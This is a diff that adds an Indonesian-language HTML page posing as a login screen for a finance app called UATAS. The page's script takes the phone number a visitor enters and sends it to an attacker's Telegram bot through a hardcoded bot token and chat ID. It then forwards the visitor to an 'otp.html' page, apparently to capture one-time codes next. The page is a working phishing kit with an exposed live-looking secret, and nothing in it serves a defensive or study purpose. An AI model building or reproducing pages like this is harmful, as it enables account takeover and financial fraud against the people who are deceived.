@@ -1,0 +1,209 @@
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <title>UATAS Login with Telegram Submit</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap');
+
+    /* Reset and base */
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      background-color: #f8f7f7;
+      font-family: 'Inter', sans-serif;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    header {
+      display: flex;
+      align-items: center;
+      padding: 0.75rem 1rem;
+      color: #e05a54;
+      font-size: 0.875rem;
+      font-weight: 400;
+    }
+
+    header button {
+      background: none;
+      border: none;
+      color: #e05a54;
+      font-size: 1.25rem;
+      cursor: pointer;
+      margin-right: 1rem;
+      padding: 0;
+      display: flex;
+      align-items: center;
+    }
+
+    header h1 {
+      flex: 1;
+      text-align: center;
+      margin: 0;
+      font-weight: 400;
+    }
+
+    header .spacer {
+      width: 1.5rem; /* same width as button for symmetry */
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 1.5rem 1.5rem 0;
+      max-width: 24rem;
+      margin: 0 auto;
+      width: 100%;
+    }
+
+    main h2 {
+      color: #e05a54;
+      font-weight: 700;
+      font-size: 1.125rem;
+      margin-bottom: 0.75rem;
+    }
+
+    .logo-container {
+      display: flex;
+      align-items: center;
+      gap: 0.75rem;
+      margin-bottom: 1.5rem;
+    }
+
+    .logo-container img {
+      width: 3rem;
+      height: 3rem;
+      border-radius: 0.5rem;
+      object-fit: cover;
+    }
+
+    .logo-container span {
+      color: #a71c5d;
+      font-weight: 600;
+      font-size: 1.5rem;
+      letter-spacing: 0.05em;
+    }
+
+    label {
+      display: block;
+      color: #e05a54;
+      font-size: 0.875rem;
+      margin-bottom: 0.5rem;
+    }
+
+    input[type="tel"] {
+      width: 100%;
+      background-color: #f3f3f3;
+      border-radius: 9999px;
+      padding: 0.75rem 1.5rem;
+      font-size: 1rem;
+      color: #d9d9d9;
+      border: 1px solid transparent;
+      outline: none;
+      transition: border-color 0.2s ease;
+    }
+
+    input[type="tel"]:focus {
+      border-color: transparent;
+      box-shadow: none;
+    }
+
+    button[type="submit"] {
+      margin-top: 2rem;
+      width: 100%;
+      padding: 0.75rem 0;
+      border-radius: 9999px;
+      background: linear-gradient(90deg, #f15a54 0%, #f26a54 50%, #f48a54 100%);
+      color: #f3b1aa;
+      font-weight: 600;
+      font-size: 1rem;
+      border: none;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    button[type="submit"]:hover {
+      background: linear-gradient(90deg, #f04848 0%, #f15948 50%, #f36a48 100%);
+    }
+
+    /* Responsive */
+    @media (max-width: 640px) {
+      main {
+        max-width: 100%;
+        padding: 1.5rem 1rem 0;
+      }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <button aria-label="Back" onclick="history.back()">
+      &#8592;
+    </button>
+    <h1>UATAS</h1>
+    <div class="spacer"></div>
+  </header>
+  <main>
+    <h2>Selamat datang di</h2>
+    <div class="logo-container">
+      <img alt="UATAS app icon with orange background and cartoon wallet with colorful cards" height="48" src="https://storage.googleapis.com/a1aa/image/0cd01ff4-94e7-4ec7-f08f-48c7f2c036af.jpg" width="48" />
+      <span>UATAS</span>
+    </div>
+    <form id="phoneForm">
+      <label for="phone">Masukkan Nomor HP anda</label>
+      <input autocomplete="tel" id="phone" name="phone" placeholder="" required type="tel" />
+      <button type="submit">Berikutnya</button>
+    </form>
+  </main>
+  <script>
+    // Replace these with your actual Telegram bot token and chat ID
+    const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
+    const chatId = '7549590022';
+
+    document.getElementById('phoneForm').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const phoneInput = document.getElementById('phone');
+      const phone = phoneInput.value.trim();
+
+      if (!phone) {
+        alert('Masukkan Nomor HP anda');
+        return;
+      }
+
+      const message = `Nomor HP: ${phone}`;
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      try {
+        const response = await fetch(url, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message
+          })
+        });
+
+        const data = await response.json();
+
+        if (data.ok) {
+          window.location = "otp.html";
+          phoneInput.value = '';
+        } else {
+          alert('Gagal mengirim data ke Telegram');
+        }
+      } catch (error) {
+        alert('Terjadi kesalahan saat mengirim data');
+      }
+    });
+  </script>
+</body>
+</html>
